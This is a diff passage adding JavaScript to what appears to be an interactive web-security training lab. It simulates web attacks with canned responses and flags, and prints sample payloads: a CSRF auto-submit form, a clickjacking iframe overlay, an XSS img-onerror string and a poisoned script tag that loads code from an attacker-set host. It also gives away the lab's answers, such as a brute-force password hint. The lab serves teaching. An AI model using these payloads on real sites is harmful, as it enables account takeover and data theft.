+        addLine(t,'ti','&#8594; Now GET same URL unauthenticated to steal data');
+        addLine(t,'ti','&#8594; FLAG{web_cache_deception}');
+      } else {
+        addLine(t,'to','&#8594; X-Cache: MISS (not cached)');
+        addLine(t,'ti','&#8594; Try appending: /style.css or /x.js or /image.jpg');
+      }
+      break;
+    case 'webcachepoisoning':
+      var hk = gv('Lwcph'), hv = gv('Lwcpv'); t = 'T_webcachepoisoning';
+      addLine(t,'tp','$ GET /  ' + hk + ': ' + hv);
+      if (['X-Forwarded-Host','X-Host','X-Forwarded-Server','X-Original-URL'].indexOf(hk) !== -1 && hv) {
+        addLine(t,'ts','&#10003; UNKEYED HEADER REFLECTED IN RESPONSE!');
+        addLine(t,'tw','&#9889; Response: &lt;script src="//' + hv + '/app.js"&gt;&lt;/script&gt;');
+        addLine(t,'to','&#8594; Cache stored poisoned response (X-Cache: HIT)');
+        addLine(t,'to','&#8594; All users now load malicious JS from ' + hv + '!');
+        addLine(t,'ti','&#8594; FLAG{web_cache_poisoning}');
+      } else {
+        addLine(t,'to','&#8594; ' + hk + ' not reflected in response');
+        addLine(t,'ti','&#8594; Try: X-Forwarded-Host or X-Host');
+      }
+      break;
+    case 'auth-enumd':
+      u = gv('Lau'); t = 'T_auth';
+      addLine(t,'tp','$ POST /login  username=' + u + ' password=wrong');
+      if (['admin','administrator','root','user','test','carlos'].indexOf(u.toLowerCase()) !== -1) {
+        addLine(t,'ts','&#10003; USERNAME ENUMERATED!');
+        addLine(t,'tw','&#8594; Response: "Incorrect password" (user EXISTS)');
+        addLine(t,'ti','&#8594; Different from "Invalid username" - confirms user');
+        addLine(t,'ti','&#8594; FLAG{auth_username_enum}');
+      } else {
+        addLine(t,'to','&#8594; Response: "Invalid username or password"');
+        addLine(t,'ti','&#8594; Try: admin, administrator, root, carlos');
+      }
+      break;
+    case 'auth-brute':
+      p = gv('Lap'); t = 'T_auth';
+      addLine(t,'tp','$ POST /login  username=admin password=' + p);
+      if (p === 'iloveyou') {
+        addLine(t,'ts','&#10003; PASSWORD FOUND!');
+        addLine(t,'tw','&#9889; admin:iloveyou - no lockout protection!');
+        addLine(t,'ti','&#8594; FLAG{auth_brute_force}');
+      } else {
+        addLine(t,'to','&#8594; 401 Unauthorized (wrong password)');
+        addLine(t,'ti','&#8594; Keep trying - no lockout! Hint: iloveyou');
+      }
+      break;
+    case 'ac-get':
+      id = parseInt(gv('Lac')); t = 'T_accesscontrol';
+      addLine(t,'tp','$ GET /api/user/' + id);
+      var users = {1:{username:'admin',email:'admin@corp.com',role:'administrator',flag:'FLAG{idor_admin}'},
+        2:{username:'jdoe',email:'jdoe@corp.com',role:'user'},
+        42:{username:'me',email:'me@example.com',role:'user'},
+        99:{username:'cfo',email:'cfo@corp.com',role:'finance',salary:'$200,000',flag:'FLAG{idor_sensitive_data}'}};
+      if (id === 42) addLine(t,'to','&#8594; 200 OK (own data): ' + JSON.stringify(users[42]));
+      else if (users[id]) {
+        addLine(t,'ts','&#10003; IDOR! Unauthorized access to user #' + id);
+        addLine(t,'to', JSON.stringify(users[id]));
+        if (users[id].flag) addLine(t,'ti','&#8594; ' + users[id].flag);
+      } else {
+        addLine(t,'te','&#8594; 404 Not Found');
+        addLine(t,'ti','&#8594; Try IDs: 1, 2, 99');
+      }
+      break;
+    case 'ac-admin':
+      t = 'T_accesscontrol';
+      addLine(t,'tp','$ GET /admin/panel  (regular user session)');
+      addLine(t,'ts','&#10003; ADMIN PANEL ACCESSIBLE!');
+      addLine(t,'tw','&#9889; No server-side auth check on /admin!');
+      addLine(t,'to','Users: 1337 | Revenue: $2.4M | Delete any user: YES');
+      addLine(t,'ti','&#8594; FLAG{access_control_vertical_priv_esc}');
+      break;
+    case 'csrf':
+      var e = gv('Lcsrf'); t = 'T_csrf';
+      addLine(t,'tp','$ Generating CSRF PoC...');
+      addLine(t,'ts','&#10003; CSRF PoC generated!');
+      addLine(t,'to','&lt;form action="https://target.com/change-email" method="POST"&gt;');
+      addLine(t,'to','  &lt;input name="email" value="' + e + '"&gt;');
+      addLine(t,'to','&lt;/form&gt;');
+      addLine(t,'to','&lt;script&gt;document.forms[0].submit()&lt;/script&gt;');
+      addLine(t,'tw','&#8594; Victim visits attacker page &#8594; email changed to ' + e);
+      addLine(t,'ti','&#8594; FLAG{csrf_form_submission}');
+      break;
+    case 'businesslogic':
+      q = parseInt(gv('Lbl')); c = gv('Lblc'); t = 'T_businesslogic';
+      addLine(t,'tp','$ POST /checkout  qty=' + q + ' coupon=' + c);
+      if (q < 0) {
+        addLine(t,'ts','&#10003; BUSINESS LOGIC FLAW! Negative quantity!');
+        addLine(t,'tw','&#9889; Total: $' + (-q * 99.99).toFixed(2) + ' CREDIT applied!');
+        addLine(t,'ti','&#8594; FLAG{biz_logic_negative_qty}');
+      } else if (q === 0) {
+        addLine(t,'ts','&#10003; Zero quantity accepted - free order!');
+        addLine(t,'ti','&#8594; FLAG{biz_logic_zero_qty}');
+      } else {
+        var total = (q * 99.99 * (c === 'SAVE10' ? 0.9 : 1)).toFixed(2);
+        addLine(t,'to','&#8594; Order total: $' + total);
+        addLine(t,'ti','&#8594; Try: quantity=-1 or quantity=0');
+      }
+      break;
+    case 'hostheader':
+      email = gv('Lhhe'); host = gv('Lhh'); t = 'T_hostheader';
+      addLine(t,'tp','$ POST /password-reset  email=' + email + '  Host: ' + host);
+      if (host !== 'target.com' && host !== 'localhost' && host.indexOf('.') !== -1) {
+        addLine(t,'ts','&#10003; HOST HEADER INJECTION!');
+        addLine(t,'tw','&#9889; Reset email sent to ' + email + ' with link:');
+        addLine(t,'to','&#8594; https://' + host + '/reset?token=abc123');
+        addLine(t,'tw','&#8594; Victim clicks &#8594; token stolen by attacker!');
+        addLine(t,'ti','&#8594; FLAG{host_header_reset_poisoning}');
+      } else {
+        addLine(t,'to','&#8594; Reset email: https://target.com/reset?token=xyz');
+        addLine(t,'ti','&#8594; Change Host header value to attacker.com');
+      }
+      break;
+    case 'clickjacking':
+      u = gv('Lcj'); t = 'T_clickjacking';
+      addLine(t,'tp','$ Checking X-Frame-Options for: ' + u);
+      if (u.indexOf('example.com') !== -1 || u.indexOf('vulnerable') !== -1 || u.indexOf('http') !== -1) {
+        addLine(t,'ts','&#10003; VULNERABLE TO CLICKJACKING!');
+        addLine(t,'tw','&#9889; No X-Frame-Options / CSP frame-ancestors!');
+        addLine(t,'to','&lt;iframe src="' + u + '" style="opacity:0.01;position:absolute;inset:0;z-index:999"&gt;&lt;/iframe&gt;');
+        addLine(t,'to','&lt;button style="position:absolute;top:150px;left:200px"&gt;WIN A PRIZE!&lt;/button&gt;');
+        addLine(t,'ti','&#8594; FLAG{clickjacking_no_frame_protection}');
+      } else {
+        addLine(t,'to','&#8594; X-Frame-Options: DENY (protected)');
+        addLine(t,'ti','&#8594; Site is protected from framing');
+      }
+      break;
+    case 'dom':
+      i = gv('Ldom'); t = 'T_dom';
+      var domOut = document.getElementById('Ldom_out');
+      addLine(t,'tp','$ GET /search#' + i);
+      addLine(t,'to','&#8594; JS: document.getElementById("out").innerHTML = location.hash.slice(1)');
+      if (/<|>/.test(i) || /on\w+=/i.test(i) || /javascript:/i.test(i)) {
+        addLine(t,'ts','&#10003; DOM-BASED XSS!');
+        addLine(t,'tw','&#9889; Unsanitized input written to innerHTML sink!');
+        addLine(t,'ti','&#8594; FLAG{dom_based_xss}');
+        if (domOut) domOut.innerHTML = '<span style="color:var(--red)">&#9888; DOM XSS: </span><code style="background:var(--rdim);padding:2px 4px;border-radius:3px;font-size:.78rem">' + i.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</code>';
+      } else {
+        addLine(t,'to','&#8594; Output: ' + i);
+        addLine(t,'ti','&#8594; Try: &lt;img src=x onerror=alert(1)&gt;');
+        if (domOut) domOut.textContent = i;
+      }
+      break;
+    case 'api':
+      ep = gv('Lapiep'); m = gv('Lapim'); t = 'T_api';
+      addLine(t,'tp','$ ' + m + ' ' + ep);
+      var apiR = {
+        '/api/v1/users/1': '&#10003; BOLA! {id:1,username:"admin",email:"admin@corp.com",role:"administrator"}',
+        '/swagger.json':   '&#10003; API DOCS EXPOSED! Full endpoint list, schemas, auth methods revealed',
+        '/api-docs':       '&#10003; API DOCS EXPOSED! 47 endpoints including /admin, /internal, /debug',
+        '/api/v2/admin/users': '&#10003; BROKEN FUNCTION-LEVEL AUTH! Admin endpoint accessible without admin role!',
+        'graphql':         '&#10003; GRAPHQL INTROSPECTION ENABLED! Full schema: types, queries, mutations exposed'
+      };
+      if (apiR[ep]) { addLine(t,'ts', apiR[ep]); addLine(t,'ti','&#8594; FLAG{api_' + ep.replace(/[^a-z0-9]/gi,'_') + '}'); }
+      else addLine(t,'to','&#8594; 403 Forbidden');
+      break;
+  }
+}
+
+/* ===== COPY BUTTON ===== */
+function copyP(btn) {
+  var text = btn.getAttribute('data-payload');
+  // decode html entities for clipboard
+  var tmp = document.createElement('textarea');
+  tmp.innerHTML = text; 
+  var decoded = tmp.value;
+  navigator.clipboard.writeText(decoded).then(function(){
+    btn.textContent = 'COPIED!';
+    setTimeout(function(){ btn.textContent = 'COPY'; }, 1500);
+  }).catch(function(){
+    btn.textContent = 'COPY';
+  });
+}
+
+/* ===== SEARCH ===== */
+var si = document.getElementById('searchInput');
+var sd = document.getElementById('sdrop');
+si.addEventListener('input', function() {
+  var q = si.value.toLowerCase().trim();
+  if (!q) { sd.classList.remove('open'); return; }
+  var res = Object.keys(V).filter(function(id){
+    return V[id].title.toLowerCase().indexOf(q) !== -1 || V[id].short.toLowerCase().indexOf(q) !== -1;
+  });
+  if (!res.length) { sd.classList.remove('open'); return; }
+  sd.innerHTML = res.map(function(id){
+    return '<div class="sri" onclick="goV(\'' + id + '\');si.value=\'\';sd.classList.remove(\'open\')">' +
+      '<div class="sri-name">' + V[id].icon + ' ' + V[id].title + '</div>' +
+      '<div class="sri-cat">' + CATL[V[id].cat] + ' &middot; ' + V[id].sev + '</div></div>';
+  }).join('');
+  sd.classList.add('open');
+});
+document.addEventListener('click', function(e){
+  if (!si.contains(e.target) && !sd.contains(e.target)) sd.classList.remove('open');
+});
+</script>
+</body>
+</html>
